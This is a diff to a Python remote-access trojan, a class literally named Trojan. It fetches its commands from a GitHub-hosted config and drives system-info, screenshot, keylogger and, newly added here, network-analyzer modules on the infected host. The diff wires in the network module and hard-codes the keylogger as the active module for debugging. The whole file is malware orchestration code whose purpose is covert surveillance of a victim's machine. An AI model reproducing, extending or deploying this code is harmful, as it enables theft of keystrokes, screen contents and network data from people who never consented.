@@ -2,10 +2,12 @@ import asyncio
 import json
 import os
 from time import sleep
+from get_config_from_github import Config
+
 from mod1_sysinfo import SysInfo
 from mod2_screenshotter import Screenshotter
 from mod3_keylogger import Keylogger
-from get_config_from_github import Config
+from mod4_netanalyzer import NetworkAnalyzer
 
 class Trojan:
     def __init__(self):
@@ -13,6 +15,7 @@ class Trojan:
         self.host_info = SysInfo().fetch_info()
         self.screenshotter = Screenshotter(self.host_info['id'])
         self.keylogger = Keylogger(self.host_info['id'])
+        self.netanalyzer = NetworkAnalyzer(self.host_info['id'])
         
         while True:
             self.controller()
@@ -38,8 +41,10 @@ class Trojan:
 
     
     def controller(self):
-        module = self.config['module']
+        #module = self.config['module']
+        module = 3
         self.reset_modules()
+        print('EXECUTING MODULE', module)
 
         if module == 1:
             self.initiate_host()
@@ -51,10 +56,11 @@ class Trojan:
             self.keylogger.start()
 
         if module == 4:
-            pass
+            self.netanalyzer.start()
 
     def reset_modules(self):
         self.keylogger.stop()
+        self.netanalyzer.stop()
 
 
 
